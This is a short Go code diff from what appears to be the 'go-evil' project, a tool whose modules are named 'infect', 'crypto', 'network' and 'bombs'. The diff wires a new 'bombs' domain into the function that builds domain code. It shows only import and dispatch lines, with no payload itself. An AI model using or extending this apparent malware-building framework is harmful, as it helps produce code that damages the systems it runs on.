@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"regexp"
 
+	"github.com/TeamPhoneix/go-evil/domains/bombs"
 	"github.com/TeamPhoneix/go-evil/domains/crypto"
 	"github.com/TeamPhoneix/go-evil/domains/infect"
 	"github.com/TeamPhoneix/go-evil/domains/network"
@@ -75,6 +76,9 @@ func construct_domain_code(domain string, function string, value string, s_json 
 
 	case "network":
 		call_functions, s_json = network.Parser(function, value, s_json)
+
+	case "bombs":
+		call_functions, s_json = bombs.Parser(function, value, s_json)
 
 	default:
 		notify.Error(fmt.Sprintf("Unknown domain '%s'", domain), "functions.construct_domain_code()")
